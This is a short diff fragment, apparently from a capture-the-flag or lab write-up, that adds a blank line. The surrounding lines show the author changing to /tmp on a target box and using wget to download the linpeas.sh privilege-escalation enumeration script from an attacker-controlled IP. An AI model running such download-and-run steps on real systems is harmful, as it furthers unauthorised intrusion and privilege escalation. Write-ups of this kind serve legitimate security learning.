@@ -168,6 +168,7 @@ in our machine:
 in the box
 
 > cd /tmp
+
 > wget IP:/linpeas.sh
 
 giving the permissions
